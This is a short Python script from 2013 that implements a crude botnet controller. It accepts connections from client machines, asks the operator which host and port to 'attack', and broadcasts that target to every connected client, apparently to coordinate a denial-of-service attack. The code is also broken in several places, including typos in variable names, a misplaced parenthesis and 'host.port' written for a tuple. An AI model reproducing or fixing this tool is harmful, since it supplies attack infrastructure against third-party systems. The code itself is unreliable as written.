###########################################################################
# MM          MM            HH      HH                  CCCCCCC  EEEEEEEE #
# MMMMM     MMMM  rr  rr    HH      HH     ssss        C         E        #
# MM  MM  MM  MM  rrrr  rr  HHHHHHHHHH  ss            C          EEEEEEEE #
# MM    MM    MM  rrr       HHHHHHHHHH    s           C          EEEEEEEE #
# MM          MM  rr        HH      HH     s  ss       C         E        #
# MM          MM  rr        HH      HH  sssss           CCCCCCC  EEEEEEEE #
###########################################################################
##                        Written in python 3.3
'''Program number: 58 Date: 9/3/2013 DtD: 1065 Copyright:(c)MrHs 2013'''

import socket
import threading
#(***** Constants *****

hostMain=socket.gethostname()

#*********************)
mainSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
mainSocket.bind((hostMain,1373))
mainSocket.listen(5)

#(**************************
clientList=[]  #A list of address of all clients


#Thread 1
def reciever(mainSocket):
    print("reciever has run")
    clientList=[]
    mainSocket.listen(5)
    while 1:
        client,addr=mainSocket.accept()
        if not (client,addr) in clientList:
            if client==mainSocket:
                break
            clientList.append((client,addr)) 
    print("Reciever terminated")
    
    host=input("Please enter the host name you wanna attack :")
    port=input("PLease insert the attack port or leave for default :")
    if port=="":
        port =80
    else:
        port=int(port)
    return((clientList,host.port))
    
#Thread 2
def stopper():    
    if input("Do you wanna stop ?")=="yes":
        print("Stopper activated")
        stopsock=socket.socket()
        stopsock.connect((socket.gethostname(),1373))
        attacker()
recieveThread=threading.Thread(target = reciever,args=(mainSocket))
stopperThread=threading.Thread(target = stopper)



#**************************)


def attacker():
    print("attacker has run")
    
    print (port)
    for i in clienList:
        attack="attack>>"+str(host)+">>"+str(port)
        i[0].sendall(attack.encode())
    print("Attack message has been sent to "+str(len(clienList)+" clients"))    

recieveThread.start()
stopperThread.start()

#Comment :
